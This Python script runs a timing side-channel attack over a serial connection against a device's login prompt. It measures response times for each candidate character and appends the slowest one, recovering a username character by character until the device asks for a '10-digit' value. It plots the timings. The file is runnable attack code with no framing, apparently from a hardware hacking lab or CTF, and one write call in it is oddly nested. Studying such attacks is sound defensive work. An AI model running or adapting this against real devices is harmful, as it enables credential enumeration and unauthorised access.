import serial
import matplotlib.pyplot as plt
import numpy
import time
from rich.console import Console
from rich.progress import Progress

KEYS = list("123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~")

def print_graph(counts):
    fig, ax = plt.subplots()

    ax.bar(KEYS, counts, label=KEYS)

    ax.set_ylabel('Response times (ns)')
    ax.set_title('Response times per key')
    ax.set_ylim([0,max(counts)])

    plt.show()

def get_username(serial_port, symbol):
    prefix = ""

    console = Console()
    console.log("[green]Start finding username", log_locals=False)
    while True:
        current_symbol = []

        while(True):
            result = serial_port.readline()
            if("Invalid" in result.decode()):
                break;
            else:
                serial_port.write(serial_port.write((".").encode("ascii")))
                serial_port.flush()

        with Progress() as progress:
            task = progress.add_task("[green]Testing symbols...", total=len(symbol))
            for i in range(len(symbol)):
                start = time.perf_counter_ns()
                serial_port.write((prefix + symbol[i]).encode("ascii"))
                serial_port.flush()

                while(True):
                    result = serial_port.readline()
                    if("Invalid" in result.decode()):
                        break;
                
                    if("10-digit" in result.decode()):
                        prefix = prefix + symbol[i]
                        progress.update(task, visible=False)
                        console.log(f"Username found : {prefix}", log_locals=False);
                        return prefix
                
                stop = time.perf_counter_ns()
                progress.update(task, advance=1)
                result = stop - start
                current_symbol.append(result)

        average = numpy.mean(current_symbol)
        for i in range(len(current_symbol)):
            current_symbol[i] = current_symbol[i] - average

        prefix += symbol[current_symbol.index(numpy.max(current_symbol))]
        progress.update(task, visible=False)
        console.log(f"Symbol found : {prefix}", log_locals=False);
        print_graph(current_symbol)

ser = serial.Serial('COM3', 115200, timeout=1)
username = get_username(ser, KEYS)